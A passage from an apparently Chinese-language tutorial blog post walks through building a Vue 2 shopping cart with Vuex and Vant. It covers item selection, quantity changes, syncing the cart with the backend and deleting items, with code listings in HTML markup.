class="title function_">toggleChecked</span> (state, id) {</span><br><span class="line">    <span class="comment">// 遍历购物车列表，找到对应id的商品，修改其选中状态</span></span><br><span class="line">    state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> {</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">goods_id</span> === id) {</span><br><span class="line">        item.<span class="property">isChecked</span> = !item.<span class="property">isChecked</span></span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">allToggle</span> (state, flag) {</span><br><span class="line">    <span class="comment">// 遍历购物车列表，修改所有商品的选中状态</span></span><br><span class="line">    state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> {</span><br><span class="line">      item.<span class="property">isChecked</span> = flag</span><br><span class="line">    })</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>给全选和商品选择框注册点击事件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;van-checkbox</span><br><span class="line">  @click="toggleChecked(item.goods_id)"</span><br><span class="line">  :value="item.isChecked"</span><br><span class="line">&gt;&lt;/van-checkbox&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;div class="all-check"&gt;</span><br><span class="line">        &lt;van-checkbox @click="allToggle" :value="isAllChecked" icon-size="18"&gt;&lt;/van-checkbox&gt;</span><br><span class="line">        全选</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">... methods: { toggleChecked (goodsId) {</span><br><span class="line">this.$store.commit('Cart/toggleChecked', goodsId) }, allToggle () {</span><br><span class="line">this.$store.commit('Cart/allToggle', !this.isAllChecked) } },</span><br></pre></td></tr></tbody></table></figure><p>辅助函数导入 isAllChecked</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="title function_">mapGetters</span>(<span class="string">'Cart'</span>, [<span class="string">'countCartTotal'</span>, <span class="string">'selectedCartList'</span>, <span class="string">'selectedCartCount'</span>, <span class="string">'selectedPrice'</span>, <span class="string">'isAllChecked'</span>])</span><br></pre></td></tr></tbody></table></figure><h3 id="数字框修改数量功能"><a class="markdownIt-Anchor" href="#数字框修改数量功能"></a> 数字框修改数量功能</h3><p>提供更新购物车的接口模块：<code>api/cart.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更新购物车商品</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">updateCart</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> { goodsId, goodsNum, goodsSkuId } = obj;</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/cart/update"</span>, {</span><br><span class="line">    goodsId,</span><br><span class="line">    goodsNum,</span><br><span class="line">    goodsSkuId,</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>在 vuex 的 cart 子模块导入使用</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { getCartList, updateCart } <span class="keyword">from</span> <span class="string">"@/api/cart"</span>;</span><br></pre></td></tr></tbody></table></figure><p>cart 子模块增加修改商品数量的 mutations 方法</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">changeCount</span> (state, obj) {</span><br><span class="line">      <span class="comment">// 遍历购物车列表，找到对应id的商品，修改其数量</span></span><br><span class="line">      <span class="keyword">const</span> { goodsId, goodsNum, goodsSkuId } = obj</span><br><span class="line">      state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">goods_id</span> === goodsId &amp;&amp; item.<span class="property">goods_sku_id</span> === goodsSkuId) {</span><br><span class="line">          item.<span class="property">goods_num</span> = goodsNum</span><br><span class="line">        }</span><br><span class="line">      })</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>cart 子模块增加同步购物车到后台的 actions 方法</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将本地购物车列表同步到服务器（结算时优先调用）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">syncCartAction</span> (context) {</span><br><span class="line">      <span class="comment">// 接口只接受三个参数：goodsId、goodsNum、goodsSkuId，所以需要遍历本地购物车列表，将选中的商品拆分为三个参数</span></span><br><span class="line">      <span class="keyword">const</span> paramsObj = {}</span><br><span class="line">      context.<span class="property">state</span>.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">isChecked</span>) {</span><br><span class="line">          paramsObj.<span class="property">goodsId</span> = item.<span class="property">goods_id</span></span><br><span class="line">          paramsObj.<span class="property">goodsNum</span> = item.<span class="property">goods_num</span></span><br><span class="line">          paramsObj.<span class="property">goodsSkuId</span> = item.<span class="property">goods_sku_id</span></span><br><span class="line">          <span class="title function_">updateCart</span>(paramsObj)</span><br><span class="line">        }</span><br><span class="line">      })</span><br><span class="line">      <span class="comment">// 打印console提示，显示本地提交同步的参数对象</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(paramsObj)</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>给数量框组件添加绑定事件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;CountBox</span><br><span class="line">  @input="changeCount(item.goods_id, $event, item.goods_sku_id)"</span><br><span class="line">  :value="item.goods_num"</span><br><span class="line">&gt;&lt;/CountBox&gt;</span><br></pre></td></tr></tbody></table></figure><p>给结算按钮添加绑定事件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div</span><br><span class="line">  v-if="true"</span><br><span class="line">  class="goPay"</span><br><span class="line">  @click="goPay"</span><br><span class="line">  :class="{ disabled: selectedCartCount === 0 }"</span><br><span class="line">&gt;结算({{selectedCartCount}})&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>methods 中提供相对应的方法</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">changeCount</span> (goodsId, e, goodsSkuId) {</span><br><span class="line">      <span class="keyword">const</span> obj = {</span><br><span class="line">        <span class="attr">goodsId</span>: goodsId,</span><br><span class="line">        <span class="attr">goodsNum</span>: e,</span><br><span class="line">        <span class="attr">goodsSkuId</span>: goodsSkuId</span><br><span class="line">      }</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">'Cart/changeCount'</span>, obj)</span><br><span class="line">    },</span><br><span class="line">    <span class="title function_">goPay</span> () {</span><br><span class="line">      <span class="comment">// 先触发购物车与后台数据的同步</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">'Cart/syncCartAction'</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 触发真正的结算</span></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>真正的结算待做。</p><h3 id="编辑切换状态删除功能"><a class="markdownIt-Anchor" href="#编辑切换状态删除功能"></a> 编辑切换状态，删除功能</h3><p>点击编辑按钮，结算按钮变为删除按钮。</p><p>给购物车页面提供一个数据用于标识是否处于编辑状态</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span> () {</span><br><span class="line">  <span class="keyword">return</span> {</span><br><span class="line">    <span class="attr">isEdit</span>: <span class="literal">false</span></span><br><span class="line">  }</span><br><span class="line">},</span><br></pre></td></tr></tbody></table></figure><p>并监视其状态</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: {</span><br><span class="line">  <span class="title function_">isEdit</span> (val) {</span><br><span class="line">    <span class="keyword">if</span> (val) {</span><br><span class="line">      <span class="comment">// 说明进入编辑状态</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">'Cart/allToggle'</span>, <span class="literal">false</span>)</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// 说明退出编辑状态</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">'Cart/allToggle'</span>, <span class="literal">true</span>)</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>相对应的对 template 中结算按钮和编辑按钮进行修改</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class="edit" @click="isEdit = !isEdit"&gt;</span><br><span class="line">  &lt;van-icon name="edit" /&gt;</span><br><span class="line">  编辑</span><br><span class="line">&lt;/span&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div v-if="!isEdit" class="goPay" @click="goPay" :class="{disabled: selectedCartCount === 0}"&gt;结算({{selectedCartCount}})</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>删除功能待做。</p><h3 id="删除商品"><a class="markdownIt-Anchor" href="#删除商品"></a> 删除商品</h3><p>封装接口模块 <code>api/cart.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除购物车商品</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">deleteSelected</span> = (<span class="params">cartIds</span>) =&gt; {</span><br><span class="line">  <span class="comment">// cartIds: 要删除的商品id数组</span></span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/cart/clear"</span>, {</span><br><span class="line">    cartIds,</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>vuex 子模块 Cart 提供异步方法</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除选中的商品</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">delSelCartA</span> (context) {</span><br><span class="line">      <span class="comment">// 获取选中的商品id然后进行删除</span></span><br><span class="line">      <span class="keyword">const</span> ids = context.<span class="property">getters</span>.<span class="property">selectedCartList</span>.<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">id</span>)</span><br><span class="line">      <span class="comment">// console.log(ids)</span></span><br><span class="line">      <span class="title function_">deleteSelected</span>(ids)</span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">'删除成功'</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 删除后重新拉取购物车数据</span></span><br><span class="line">      context.<span class="title function_">dispatch</span>(<span class="string">'getCartAction'</span>)</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>接着修复了一些小 bug：商品详情页初始不显示购物车数量、添加到购物车之后数量不会自动更新、购物车页面编辑状态退出后按钮未恢复到结算按钮。下面是修复后的 <code>store/modules/cart.js</code> 和 <code>views/productdetail.vue</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { getCartList, updateCart, deleteSelected, addCart } <span class="keyword">from</span> <span class="string">"@/api/cart"</span>;</span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">Toast</span> } <span class="keyword">from</span> <span class="string">"vant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="comment">// 提供一个数组用于存储购物车列表</span></span><br><span class="line">      <span class="attr">cartList</span>: [],</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">mutations</span>: {</span><br><span class="line">    <span class="comment">// 提供方法可以设置购物车列表</span></span><br><span class="line">    <span class="title function_">setCartList</span>(<span class="params">state, newCartList</span>) {</span><br><span class="line">      state.<span class="property">cartList</span> = newCartList;</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 修改商品选中状态</span></span><br><span class="line">    <span class="title function_">toggleChecked</span>(<span class="params">state, id</span>) {</span><br><span class="line">      <span class="comment">// 遍历购物车列表，找到对应id的商品，修改其选中状态</span></span><br><span class="line">      state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">goods_id</span> === id) {</span><br><span class="line">          item.<span class="property">isChecked</span> = !item.<span class="property">isChecked</span>;</span><br><span class="line">        }</span><br><span class="line">      });</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 全选和反选</span></span><br><span class="line">    <span class="title function_">allToggle</span>(<span class="params">state, flag</span>) {</span><br><span class="line">      <span class="comment">// 遍历购物车列表，修改所有商品的选中状态</span></span><br><span class="line">      state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> {</span><br><span class="line">        item.<span class="property">isChecked</span> = flag;</span><br><span class="line">      });</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 改变商品数量</span></span><br><span class="line">    <span class="title function_">changeCount</span>(<span class="params">state, obj</span>) {</span><br><span class="line">      <span class="comment">// 遍历购物车列表，找到对应id的商品，修改其数量</span></span><br><span class="line">      <span class="keyword">const</span> { goodsId, goodsNum, goodsSkuId } = obj;</span><br><span class="line">      state.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">goods_id</span> === goodsId &amp;&amp; item.<span class="property">goods_sku_id</span> === goodsSkuId) {</span><br><span class="line">          item.<span class="property">goods_num</span> = goodsNum;</span><br><span class="line">        }</span><br><span class="line">      });</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">actions</span>: {</span><br><span class="line">    <span class="comment">// 添加商品到购物车</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">addCartAction</span>(<span class="params">context, obj</span>) {</span><br><span class="line">      <span class="comment">// 先判断是否已经存在该商品，如果存在，则只修改商品数量</span></span><br><span class="line">      <span class="keyword">const</span> { goodsId, goodsNum, goodsSkuId } = obj;</span><br><span class="line">      context.<span class="property">state</span>.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">goods_id</span> === goodsId &amp;&amp; item.<span class="property">goods_sku_id</span> === goodsSkuId) {</span><br><span class="line">          item.<span class="property">goods_num</span> += goodsNum;</span><br><span class="line">        }</span><br><span class="line">      });</span><br><span class="line">      <span class="comment">// 如果不存在，则添加到购物车列表</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">addCart</span>(goodsId, goodsNum, goodsSkuId);</span><br><span class="line">      <span class="keyword">await</span> context.<span class="title function_">dispatch</span>(<span class="string">"getCartAction"</span>); <span class="comment">// 重新拉取购物车信息</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">"添加成功"</span>);</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异步获取购物车列表</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getCartAction</span>(<span class="params">context</span>) {</span><br><span class="line">      <span class="keyword">const</span> { data } = <span class="keyword">await</span> <span class="title function_">getCartList</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 由于后台返回数据中不包括是否选中的状态，所以本地自己维护，给每一项添加上被选中的状态</span></span><br><span class="line">      data.<span class="property">list</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> {</span><br><span class="line">        element.<span class="property">isChecked</span> = <span class="literal">true</span>;</span><br><span class="line">      });</span><br><span class="line">      context.<span class="title function_">commit</span>(<span class="string">"setCartList"</span>, data.<span class="property">list</span>);</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将本地购物车列表同步到服务器（结算或者离开购物车页面立刻同步）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">syncCartAction</span>(<span class="params">context</span>) {</span><br><span class="line">      <span class="comment">// 接口只接受三个参数：goodsId、goodsNum、goodsSkuId，所以需要遍历本地购物车列表，将选中的商品拆分为三个参数</span></span><br><span class="line">      <span class="keyword">const</span> paramsObj = {};</span><br><span class="line">      context.<span class="property">state</span>.<span class="property">cartList</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">isChecked</span>) {</span><br><span class="line">          paramsObj.<span class="property">goodsId</span> = item.<span class="property">goods_id</span>;</span><br><span class="line">          paramsObj.<span class="property">goodsNum</span> = item.<span class="property">goods_num</span>;</span><br><span class="line">          paramsObj.<span class="property">goodsSkuId</span> = item.<span class="property">goods_sku_id</span>;</span><br><span class="line">          <span class="title function_">updateCart</span>(paramsObj);</span><br><span class="line">        }</span><br><span class="line">      });</span><br><span class="line">      <span class="comment">// console.log(paramsObj)</span></span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除选中的商品</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">delSelCartA</span>(<span class="params">context</span>) {</span><br><span class="line">      <span class="comment">// 获取选中的商品id然后进行删除</span></span><br><span class="line">      <span class="keyword">const</span> ids = context.<span class="property">getters</span>.<span class="property">selectedCartList</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item.<span class="property">id</span>);</span><br><span class="line">      <span class="comment">// console.log(ids)</span></span><br><span class="line">      <span class="title function_">deleteSelected</span>(ids);</span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">"删除成功"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 删除后重新拉取购物车数据</span></span><br><span class="line">      context.<span class="title function_">dispatch</span>(<span class="string">"getCartAction"</span>);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">getters</span>: {</span><br><span class="line">    <span class="comment">// 求所有的商品累加总数</span></span><br><span class="line">    <span class="title function_">countCartTotal</span>(<span class="params">state</span>) {</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">reduce</span>(</span><br><span class="line">        <span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span>,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">      );</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品项目</span></span><br><span class="line">    <span class="title function_">selectedCartList</span>(<span class="params">state</span>) {</span><br><span class="line">      <span class="comment">// filter只会接收回调结果为true的元素，所以可以不用做其他判断</span></span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">filter</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item.<span class="property">isChecked</span>);</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品项目数量</span></span><br><span class="line">    <span class="title function_">selectedCartCount</span>(<span class="params">state, getters</span>) {</span><br><span class="line">      <span class="comment">// 这里的getters可以获取到上面定义的getters</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(getters.<span class="property">selectedCartList</span>)</span><br><span class="line">        ? getters.<span class="property">selectedCartList</span>.<span class="title function_">reduce</span>(</span><br><span class="line">            <span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">          )</span><br><span class="line">        : <span class="number">0</span>;</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品总价</span></span><br><span class="line">    <span class="title function_">selectedPrice</span>(<span class="params">state, getters</span>) {</span><br><span class="line">      <span class="comment">// toFixed(2) 保留两位小数</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(getters.<span class="property">selectedCartList</span>)</span><br><span class="line">        ? getters.<span class="property">selectedCartList</span></span><br><span class="line">            .<span class="title function_">reduce</span>(</span><br><span class="line">              <span class="function">(<span class="params">sum, item, index</span>) =&gt;</span></span><br><span class="line">                sum + item.<span class="property">goods_num</span> * item.<span class="property">goods</span>.<span class="property">goods_price_min</span>,</span><br><span class="line">              <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_">toFixed</span>(<span class="number">2</span>)</span><br><span class="line">        : <span class="number">0</span>;</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 是否全选</span></span><br><span class="line">    <span class="title function_">isAllChecked</span>(<span class="params">state</span>) {</span><br><span class="line">      <span class="comment">// every返回true，说明数组中每一项都为true，否则为false</span></span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">every</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item.<span class="property">isChecked</span>);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>商品详情页增加：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { mapGetters, mapActions } <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attr">computed</span>: {</span><br><span class="line">    ...<span class="title function_">mapGetters</span>(<span class="string">'Cart'</span>, [<span class="string">'countCartTotal'</span>]),</span><br><span class="line">    ...<span class="title function_">mapActions</span>(<span class="string">'Cart'</span>, [<span class="string">'getCartAction'</span>]),</span><br><span class="line">    <span class="title function_">detailId</span> () {</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">id</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> match  <span class="comment">// 此为created内</span></span><br><span class="line">    <span class="keyword">while</span> ((match = regex.<span class="title function_">exec</span>(htmlString)) !== <span class="literal">null</span>) {</span><br><span class="line">      srcArray.<span class="title function_">push</span>(match[<span class="number">1</span>]) <span class="comment">// 将匹配到的 src URL 